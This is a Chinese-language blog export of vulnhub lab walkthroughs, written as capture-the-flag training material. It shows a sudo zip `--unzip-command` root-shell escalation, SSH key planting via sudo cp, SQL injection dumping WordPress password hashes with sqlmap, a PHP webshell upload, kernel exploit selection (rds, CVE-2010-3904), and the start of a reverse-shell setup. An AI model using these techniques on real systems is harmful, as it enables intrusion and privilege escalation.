<p>现在已经转移了公钥，现在使用cp命令作为sarang用户在sarang用户主目录中的.ssh目录中复制公钥了。 需要将sudo与cp命令一起使用，并提供源目录和目标目录。 完成此操作后，只需要使用刚转让的密钥以sarang身份登录即可。 可以看到它运行良好。 以成功的用户身份登录后，再次运行sudo -l命令，因为该用户不是root用户，目标是获得root用户。 看到zip命令具有sudo权限，可滥用该权限来升级此计算机上的特权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinak@ubuntu:~$ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys</span><br><span class="line">pinak@ubuntu:~$ ssh sarang@127.0.0.1 -i /.ssh/authorized_keys -p 65345</span><br><span class="line">Warning: Identity file /.ssh/authorized_keys not accessible: No such file or directory.</span><br><span class="line">The authenticity of host <span class="string">&#x27;[127.0.0.1]:65345 ([127.0.0.1]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[127.0.0.1]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/home/pinak/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 21:35:24 2019 from 192.168.0.100</span></span><br><span class="line"><span class="string">sarang@ubuntu:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for sarang on ubuntu:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass,</span></span><br><span class="line"><span class="string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User sarang may run the following commands on ubuntu:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/zip</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用最近通过ssh登录的用户sarang。 使用sudo命令列出用户可以使用root特权运行的所有命令，可以看到用户可以以root用户身份运行zip命令，而无需输入任何密码。<br>因此，现在正在将权限从“sarang”提升到“root”。 创建一个文件“lucifer11”，然后执行命令：首先将文件“lucifer11”压缩，然后将其移动到/tmp/lucifer11.zip文件夹，最后解压缩，然后弹出root的shell，提权成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sarang@ubuntu:~$ touch lucifer11</span><br><span class="line">sarang@ubuntu:~$ ls</span><br><span class="line">lucifer11</span><br><span class="line">sarang@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/sarang</span><br><span class="line">sarang@ubuntu:~$ sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br><span class="line">  adding: home/sarang/lucifer11 (stored 0%)</span><br><span class="line">root@ubuntu:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>这次提权方式太帅，记下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># cd /root</span></span><br><span class="line">root@ubuntu:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@ubuntu:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">          </span><br><span class="line">                                            @p</span><br><span class="line">                                           @@@.</span><br><span class="line">                                          @@@@@</span><br><span class="line">                                         @@@@@@@</span><br><span class="line">                                        *<span class="string">&quot;`]@P ^^</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                               ,,,,        ]@P       ,,gg,,</span></span><br><span class="line"><span class="string">                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,</span></span><br><span class="line"><span class="string">                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w</span></span><br><span class="line"><span class="string">                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g</span></span><br><span class="line"><span class="string">                    g@@@P`                 -@                   &quot;</span>B@@w</span><br><span class="line">                  ,@@@`                    ]@                      %@@,</span><br><span class="line">                 @@P-                      ]@                        *@@,</span><br><span class="line">              ,@@<span class="string">&quot;                         ]@                          *B@</span></span><br><span class="line"><span class="string">            ,@N&quot;</span>                          y@@B                            %@,</span><br><span class="line">      ,,  g@P-                            ]@@@P                             *Bg ,gg</span><br><span class="line">      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!! Congrats you have finished this task !!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contact us here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hacking Articles : https://twitter.com/rajchandel/</span></span><br><span class="line"><span class="string">Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span></span><br><span class="line"><span class="string"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">____________________________________</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg"></p>
<p>Flag太帅，犹如利剑正中敌人心脏！！！然后狠狠穿透！！！</p>
<p><font color="red">Key:网页用户名收集，hydra爆破,ssh公钥滥用,/usr/bin/zip,/bin/cp的无需root密码的权限滥用。</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Hackademic-RTB1]</title>
    <url>/2019/12/11/Hackademic-RTB1/</url>
    <content><![CDATA[<p>名称：Hackademic：RTB1<br>发布日期：2011年9月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMS56aXA=">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMS56aXAudG9ycmVudA==">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>这是mr.pr0n提出的第一个现实性黑客攻击挑战<br>下载目标并获得root。<br>尝试读取根目录中文件“ key.txt”的内容。<br>请享用！</p>
<p>漏洞：</p>
<ul>
<li>纯文本密码</li>
<li>提权</li>
<li>重用凭证</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<p>靶机打开界面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub37.jpg"></p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.140</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:01:8A:4D (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.140</span></span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">22/tcp closed ssh</span><br><span class="line">80/tcp open   http    Apache httpd 2.2.15 ((Fedora))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_http-server-header: Apache/2.2.15 (Fedora)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">| http-vuln-cve2011-3192: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Apache byterange filter DoS</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span></span><br><span class="line"><span class="string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span></span><br><span class="line"><span class="string">|       overlapping byte ranges are requested.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2011-08-19</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.tenable.com/plugins/nessus/55976</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/49303</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span></span><br><span class="line"><span class="string">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.15: </span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span></span><br><span class="line"><span class="string">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span></span><br><span class="line"><span class="string">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-12171  6.4     https://vulners.com/cve/CVE-2017-12171</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br></pre></td></tr></table></figure>

<p>打开发现是wordpress的，直接上wpscan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.5</span></span><br><span class="line"><span class="string">                               </span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Updating the Database ...</span></span><br><span class="line"><span class="string">[i] Update completed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line"><span class="string">[+] Started: Tue Dec 10 21:58:17 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.2.15 (Fedora)</span></span><br><span class="line"><span class="string"> |  - X-Powered-By: PHP/5.3.3</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.84.140/Hackademic_RTB1/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 1.5.1.1 identified (Insecure, released on 2007-09-24).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, &lt;!-- generator=&quot;wordpress/1.5.1.1&quot; --&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=1.5.1.1&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: starburst</span></span><br><span class="line"><span class="string"> | Location: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.1 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2008-09-15T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Starburst</span></span><br><span class="line"><span class="string"> | Style URI: http://starburst.weirdncrazy.com</span></span><br><span class="line"><span class="string"> | Description: A WordPress 1.5/2....</span></span><br><span class="line"><span class="string"> | Author: Claire</span></span><br><span class="line"><span class="string"> | Author URI: http://www.weirdncrazy.com/universe/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css, Match: &#x27;</span>Version: 1.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub38.jpg"></p>
<p>点击之后在后面加上单引号，明显有注入</p>
<p>直接上sqlmap,这站太烂了;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1576033944962.req -D wordpress -T wp_users --dump</span><br><span class="line"></span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| ID | user_idmode | user_ip | user_icq | user_msn | user_yim | user_url | user_aim | user_pass                        | user_login   | user_level | user_email              | user_status | user_domain | user_browser | user_nicename | user_nickname | user_lastname | user_firstname | user_registered     | user_description | user_activation_key |</span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| 1  | login       | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          | NickJames@hacked.com    | 0           | &lt;blank&gt;     | &lt;blank&gt;      | nickjames     | NickJames     | James         | Nick           | 2010-10-25 20:40:23 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 2  | login       | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          | JohnSmith@hacked        | 0           | &lt;blank&gt;     | &lt;blank&gt;      | johnsmith     | JohnSmith     | Smith         | John           | 2010-10-25 21:25:22 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 3  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         | GeorgeMiller@hacked.com | 0           | &lt;blank&gt;     | &lt;blank&gt;      | georgemiller  | GeorgeMiller  | Miller        | George         | 2011-01-07 03:08:51 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 4  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          | TonyBlack@hacked.com    | 0           | &lt;blank&gt;     | &lt;blank&gt;      | tonyblack     | TonyBlack     | Black         | Tony           | 2011-01-07 03:09:55 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 5  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          | JasonKonnors@hacked.com | 0           | &lt;blank&gt;     | &lt;blank&gt;      | jasonkonnors  | JasonKonnors  | Konnors       | Jason          | 2011-01-07 03:10:36 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 6  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          | MaxBucky@hacked.com     | 0           | &lt;blank&gt;     | &lt;blank&gt;      | maxbucky      | MaxBucky      | Bucky         | Max            | 2011-01-07 03:11:18 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line"></span><br><span class="line">NickJames   21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">JohnSmith   b986448f0bb9e5e124ca91d3d650f52c</span><br><span class="line">GeorgeMiller  7cbb3252ba6b7e9c422fac5334d22054</span><br><span class="line">TonyBlack   a6e514f9486b83cb53d8d932f9a04292</span><br><span class="line">JasonKonnors 8601f6e1028a8e8a966f6c33fcd9aec4</span><br><span class="line">MaxBucky   50484c19f1afdaf3841a0d821ed393d2</span><br></pre></td></tr></table></figure>

<h3 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h3><p>5个用户爆出账号密码之后，发现GeorgeMiller有管理员权限，使用此账号登录GeorgeMiller/q1w2e3<br>如下图所示改为允许php文件上传</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub39.jpg"></p>
<p>上传文件成功</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub40.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub41.jpg"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>冰蝎中执行命令查看内核版本</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub42.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 <span class="comment">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>为此内核使用漏洞利用建议脚本。 可以在这里下载脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BlbnR1cmFMYWJzL0xpbnV4X0V4cGxvaXRfU3VnZ2VzdGVy">Linux_Exploit_Suggester<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./Linux_Exploit_Suggester.pl -k 2.6.31</span></span><br><span class="line"></span><br><span class="line">Kernel <span class="built_in">local</span>: 2.6.31</span><br><span class="line"></span><br><span class="line">Searching among 65 exploits...</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] american-sign-language</span><br><span class="line">   CVE-2010-4347</span><br><span class="line">   Source: http://www.securityfocus.com/bid/45408/</span><br><span class="line">[+] can_bcm</span><br><span class="line">   CVE-2010-2959</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/14814/</span><br><span class="line">[+] do_pages_move</span><br><span class="line">   Alt: sieve    CVE-2010-0415</span><br><span class="line">   Source: Spenders Enlightenment</span><br><span class="line">[+] half_nelson</span><br><span class="line">   Alt: econet    CVE-2010-3848</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/6851</span><br><span class="line">[+] half_nelson1</span><br><span class="line">   Alt: econet    CVE-2010-3848</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] half_nelson2</span><br><span class="line">   Alt: econet    CVE-2010-3850</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] half_nelson3</span><br><span class="line">   Alt: econet    CVE-2010-4073</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] msr</span><br><span class="line">   CVE-2013-0268</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/27297/</span><br><span class="line">[+] pipe.c_32bit</span><br><span class="line">   CVE-2009-3547</span><br><span class="line">   Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c</span><br><span class="line">[+] pktcdvd</span><br><span class="line">   CVE-2010-3437</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15150/</span><br><span class="line">[+] ptrace_kmod2</span><br><span class="line">   Alt: ia32syscall,robert_you_suck    CVE-2010-3301</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15023/</span><br><span class="line">[+] rawmodePTY</span><br><span class="line">   CVE-2014-0196</span><br><span class="line">   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c</span><br><span class="line">[+] rds</span><br><span class="line">   CVE-2010-3904</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15285/</span><br><span class="line">[+] reiserfs</span><br><span class="line">   CVE-2010-1146</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/12130/</span><br><span class="line">[+] video4linux</span><br><span class="line">   CVE-2010-3081</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15024/</span><br></pre></td></tr></table></figure>

<p>一个个慢慢尝试，直到使用了rds这个exploit成功了。<br>[+] rds<br>   CVE-2010-3904<br>   Source: <span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">http://www.exploit-db.com/exploits/15285/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>然后使用冰蝎的shell将15285.c上传到服务器目录下</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub43.jpg"></p>
<p>locate命令查找kali中的php的reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># locate shells</span></span><br><span class="line">/usr/share/webshells/asp</span><br><span class="line">/usr/share/webshells/aspx</span><br><span class="line">/usr/share/webshells/cfm</span><br><span class="line">/usr/share/webshells/jsp</span><br><span class="line">/usr/share/webshells/laudanum</span><br><span class="line">/usr/share/webshells/perl</span><br><span class="line">/usr/share/webshells/php</span><br><span class="line">/usr/share/webshells/asp/cmd-asp-5.1.asp</span><br><span class="line">/usr/share/webshells/asp/cmdasp.asp</span><br><span class="line">/usr/share/webshells/aspx/cmdasp.aspx</span><br><span class="line">/usr/share/webshells/cfm/cfexec.cfm</span><br><span class="line">/usr/share/webshells/jsp/cmdjsp.jsp</span><br><span class="line">/usr/share/webshells/jsp/jsp-reverse.jsp</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/perl/perlcmd.cgi</span><br><span class="line">/usr/share/webshells/php/findsocket</span><br><span class="line">/usr/share/webshells/php/php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/qsd-php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/simple-backdoor.php</span><br><span class="line">/usr/share/webshells/php/findsocket/findsock.c</span><br><span class="line">/usr/share/webshells/php/findsocket/php-findsock-shell.php</span><br></pre></td></tr></table></figure>

<p>其中/usr/share/webshells/php/php-reverse-shell.php即为要使用的shell,leafpad打开此文件修改ip地址和端口号如下图,改成kali攻击机的ip和端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub44.jpg"></p>
<p>然后同样如上方式上传到服务器的目录下,浏览器访问该木马，同时kali攻击机上nc监听</p>
